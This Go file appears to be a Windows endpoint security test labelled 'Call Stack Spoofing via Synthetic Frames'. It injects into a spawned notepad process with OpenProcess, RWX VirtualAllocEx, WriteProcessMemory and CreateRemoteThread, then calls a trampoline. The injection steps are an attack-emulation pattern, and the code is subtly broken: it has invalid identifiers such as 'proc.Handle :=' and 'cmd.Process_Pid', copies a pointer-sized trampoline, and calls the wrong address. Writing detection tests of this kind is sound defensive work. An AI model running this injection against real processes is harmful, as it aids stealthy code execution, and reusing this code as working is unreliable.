//go:build windows
// +build windows

/*
ID: d8c57cb7-bab6-41fa-9063-dcc8793c3955
NAME: Call Stack Spoofing via Synthetic Frames
CREATED: 2024-07-02
scenario: Detects Windows Memory API calls within a potentially altered call stack in order to conceal the true source of the
call.
*/
package main

import (
	"fmt"
	"os/exec"
	"syscall"
	"unsafe"

	Endpoint "github.com/preludeorg/test/endpoint"
	"golang.org/x/sys/windows"
)

func main() {
	Endpoint.Say("[+] Starting Call Stack Spoofing via Synthetic Frames VST")
	Endpoint.Start(test, cleanup)
}

func test() {
	proc.Handle := windows.Handle(0)
	remoteProcHandle := windows.Handle(0)
	var err error

	// start process
	cmd := exec.Command("notepad.exe")
	err = cmd.Start()
	if err != nil {
		Endpoint.Say(fmt.Sprintf("failed to start process: %s", err))
		Endpoint.Stop(1) // ERROR
	}
	defer cmd.Process.Kill()

	// get process handle
	procHandle, err = windows.OpenProcess(windows.PROCESS_ALL_ACCESS, false, uint32(cmd.Process_Pid))
	if err != nil {
		Endpoint.Say(fmt.Sprintf("failed to get process handle: %s", err))
		Endpoint.Stop(1) // ERROR
	}

	// allocate memory to target process
	var remoteAddr uintptr
	remoteAddr, err = windows.VirtualAllocEx(procHandle, 0, 4096, windows.MEM_COMMIT, windows.PAGE_EXECUTE_READWRITE)
	if err != nil {
		Endpoint.Say(fmt.Sprintf("[-] Failed to allocate memory: %s", err))
		Endpoint.Stop(1) // ERROR
	}

	// write shellcode to allocated memory
	shellcode := []byte{0x90, 0x90, 0x90, 0x90} // NOP slide placeholder
	var written uint32
	err = windows.WriteProcessMemory(procHandle, remoteAddr, &shellcode[0], uint32(len(shellcode)), &written)
	if err != nil {
		Endpoint.Say(fmt.Sprintf("[-] Failed to write to process memory: %s", err))
		Endpoint.Stop(1) // ERROR
	}

	// create remote thread in target process
	var threadHandle windows.Handle
	threadHandle, err = windows.CreateRemoteThread(procHandle, nil, 0, remoteAddr, 0, 0, nil)
	if err != nil {
		Endpoint.Say(fmt.Sprintf("[-] Failed to create remote thread: %s", err))
		Endpoint.Stop(1) // ERROR
	}
	defer windows.CloseHandle(threadHandle)

	// alter call stack
	alterCallStack()
	Endpoint.Say("[+] Call stack spoofing executed successfully")
	Endpoint.Stop(101) // UNPROTECTED: Malicious behavior not blocked
}

func alterCallStack() {
	// altering stack using trampoline function
	trampoline := syscall.NewCallback(func() uintptr {
		// jump to real target func
		return 0
	})

	// allocate memory to trampoline func
	mem, err := windows.VirtualAlloc(0, 4096, windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_EXECUTE_READWRITE)
	if err != nil {
		Endpoint.Say(fmt.Sprintf("[-] Failed to allocate memory for trampoline: %s", err))
		Endpoint.Stop(1) // ERROR
	}

	// write trampoline to allocated memory
	trampolineAddr := (uintptr)(unsafe.Pointer(trampoline))
	trampolineSize := uintptr(unsafe.Sizeof(trampoline))
	copy((*(*[1 << 20]byte)(unsafe.Pointer(mem)))[:], (*(*[1 << 20]byte)(unsafe.Pointer(trampolineAddr)))[:trampolineSize])

	// call trampoline to alter call stack
	syscall.Syscall(trampolineAddr, 0, 0, 0, 0)
}

func cleanup() {
	Endpoint.Say("[+] Cleanup completed successfully")
	Endpoint.Stop(100) // PROTECTED
}